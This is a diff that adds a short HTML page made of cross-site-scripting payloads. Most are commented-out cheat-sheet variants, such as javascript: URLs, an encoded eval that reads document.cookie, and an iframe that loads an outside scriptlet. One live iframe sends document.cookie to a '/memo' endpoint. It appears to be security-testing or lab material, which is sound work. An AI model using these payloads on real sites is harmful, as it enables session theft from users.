@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<BODY>
+    <!-- <iframe src=http://ha.ckers.org/scriptlet.html  -->
+    <!-- <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br> -->
+    
+    <!-- <IFRAME SRC="javascript:alert('XSS');"></IFRAME> -->
+    <!-- <a href="&#x6A;avascript:alert(document.cookie)">Click this link!</a> -->
+    <!-- <body onload="eval(atob['YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='])"> -->
+    <!-- <iframe src=# onmouseover=alert(String.fromCharCode(88,83,83))></iframe> -->
+
+    <!-- <img src="java    script:al ert('Successful XSS')"> -->
+
+    <iframe src="javascript:location.href=`'/memo?memo=' + document.cookie`" ></iframe>
+
+
+
+</BODY>
+</html>
+    
